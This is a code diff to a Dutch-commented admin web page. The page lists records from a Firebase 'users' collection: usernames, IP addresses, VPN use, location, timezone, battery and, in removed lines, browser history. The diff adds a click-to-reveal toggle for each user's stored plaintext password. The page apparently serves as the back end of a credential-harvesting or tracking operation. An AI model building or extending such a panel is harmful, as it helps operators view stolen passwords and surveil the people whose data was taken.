@@ -69,6 +69,10 @@
     .detail-row{border:1px solid var(--line); padding:10px 12px; background:#fff}
     .mono{font-family:inherit}
     .h{font-weight:700; margin-bottom:6px}
+
+    /* klikbare wachtwoordchip */
+    .pwd-chip{display:inline-block; padding:2px 6px; border:1px solid var(--line); cursor:pointer; user-select:none}
+    .pwd-chip:hover{background:#f7f7f7}
   </style>
 
   <!-- Firebase SDK -->
@@ -144,7 +148,7 @@
         const snap = await getDocs(query(collection(db,'users'), orderBy('timestamp','desc')));
         snap.forEach(doc => users.push({id:doc.id, ...doc.data()}));
       }catch(e){
-        // still render empty panel
+        // toon leeg paneel
       }
 
       document.body.innerHTML = `
@@ -200,7 +204,7 @@
         });
       });
 
-      // select user
+      // select user + wachtwoord toggle
       list.querySelectorAll('.item').forEach(el=>{
         el.addEventListener('click', ()=>{
           list.querySelectorAll('.item').forEach(n=>n.classList.remove('selected'));
@@ -210,8 +214,13 @@
           const ts = u.timestamp?.toDate ? u.timestamp.toDate() : (u.timestamp ? new Date(u.timestamp) : null);
           const tsStr = ts ? new Date(ts).toLocaleString() : 'Onbekend';
 
+          const safePwd = (u.password && typeof u.password === 'string') ? u.password : 'Niet beschikbaar';
+
           det.innerHTML = `
             <div class="detail-row">[ username ] ${u.username || 'Niet beschikbaar'}</div>
+            <div class="detail-row">[ password ] <span id="pwd-${id}" class="pwd-chip mono" data-state="hidden" data-value="${encodeHtml(
+              safePwd
+            )}">••••••••</span>  <span class="muted">— klik om te tonen/verbergen</span></div>
             <div class="detail-row">[ vpn ] ${u.vpnUsed===true?'Ja':(u.vpnUsed===false?'Nee':'Onbekend')}</div>
             <div class="detail-row">[ ip ] <span class="mono">${u.ipAddress || 'Niet beschikbaar'}</span></div>
             <div class="detail-row">[ server ] ${u.serverLocation || 'Niet beschikbaar'}</div>
@@ -221,14 +230,38 @@
             <div class="detail-row">[ lang ] ${u.language || 'Niet beschikbaar'}</div>
             <div class="detail-row">[ tz ] ${u.timezone || 'Niet beschikbaar'}</div>
             <div class="detail-row">[ battery ] ${u.battery || 'Niet beschikbaar'}</div>
-            <div class="detail-row">[ history ] ${u.browserHistory || 'Niet beschikbaar'}</div>
             <div class="detail-row">[ timestamp ] ${tsStr}</div>
           `;
+
+          // toggle logic
+          const pwdEl = document.getElementById(`pwd-${id}`);
+          pwdEl.addEventListener('click', ()=>{
+            const state = pwdEl.getAttribute('data-state');
+            if(state === 'hidden'){
+              pwdEl.textContent = pwdEl.getAttribute('data-value') || 'Niet beschikbaar';
+              pwdEl.setAttribute('data-state','shown');
+            }else{
+              pwdEl.textContent = '••••••••';
+              pwdEl.setAttribute('data-state','hidden');
+            }
+          });
         });
       });
 
       // logout
       document.getElementById('logoutBtn').addEventListener('click', ()=> signOut(auth));
+
+      // helper: simple HTML escape for attribute injection safety
+      function encodeHtml(s){
+        return String(s)
+          .replaceAll('&','&amp;')
+          .replaceAll('<','&lt;')
+          .replaceAll('>','&gt;')
+          .replaceAll('"','&quot;')
+          .replaceAll("'","&#039;");
+      }
+      // expose so template string above can call it
+      window.encodeHtml = encodeHtml;
     }
   </script>
 </head>
